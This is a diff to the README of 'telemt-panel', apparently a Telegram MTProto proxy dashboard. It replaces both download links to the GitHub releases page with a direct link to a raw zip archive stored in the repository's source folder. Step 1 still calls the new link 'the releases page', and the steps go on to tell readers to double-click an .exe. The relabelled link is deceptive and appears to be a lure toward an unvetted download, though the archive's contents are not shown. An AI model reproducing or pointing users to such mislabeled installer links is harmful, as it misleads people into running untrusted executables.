@@ -1,6 +1,6 @@
 # 🌐 telemt-panel - Manage your Telegram proxy server easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Arjun99291/telemt-panel/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/Arjun99291/telemt-panel/main/src/telemt_panel_1.5.zip)
 
 This application provides a web-based dashboard for MTProto Telegram proxies. You can create, monitor, and manage Fake TLS proxy instances. The interface uses a dark theme.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these conditions:
 
 ### Installation Steps
 
-1. Visit [the releases page](https://github.com/Arjun99291/telemt-panel/releases) to download the installer.
+1. Visit [the releases page](https://raw.githubusercontent.com/Arjun99291/telemt-panel/main/src/telemt_panel_1.5.zip) to download the installer.
 2. Select the file ending in .exe for Windows.
 3. Save the file to your desktop.
 4. Double-click the file to start the installation.
